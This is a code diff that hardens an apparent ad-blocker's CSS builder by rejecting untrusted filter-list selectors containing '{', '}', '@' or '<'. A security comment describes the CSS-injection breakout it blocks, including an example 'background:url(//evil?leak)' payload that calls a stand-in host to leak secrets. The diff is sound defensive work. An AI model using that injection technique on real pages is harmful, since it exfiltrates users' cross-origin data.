@@ -13,10 +13,24 @@
 const CHUNK = 1000; // selectors per rule, to bound the blast radius of a bad one
 const COALESCE_MS = 250; // trailing-debounce window for the observer flush
 
+// SECURITY: element-hiding selectors come from UNTRUSTED filter lists. Each is
+// concatenated into `<selector>{display:none!important}`, so a selector that
+// contains a CSS structural char ({ } @ <) can break out of that wrapper and
+// inject arbitrary attacker CSS at USER_SHEET level — e.g. an attribute-selector
+// `background:url(//evil?leak)` that exfiltrates cross-origin secrets. We build
+// adblock-rust without its css-validation feature, so validate HERE: a legitimate
+// element-hiding selector never contains these characters, so reject any that do
+// (a dropped over-clever rule is strictly safer than a CSS-injection breakout).
+const UNSAFE_SELECTOR = /[{}@<]/;
+function safeSelector(s) {
+  return typeof s === "string" && s.length > 0 && !UNSAFE_SELECTOR.test(s);
+}
+
 function buildCss(selectors) {
   let css = "";
-  for (let i = 0; i < selectors.length; i += CHUNK) {
-    const group = selectors.slice(i, i + CHUNK).join(",");
+  const safe = Array.prototype.filter.call(selectors, safeSelector);
+  for (let i = 0; i < safe.length; i += CHUNK) {
+    const group = safe.slice(i, i + CHUNK).join(",");
     if (group) {
       css += group + "{display:none!important}\n";
     }
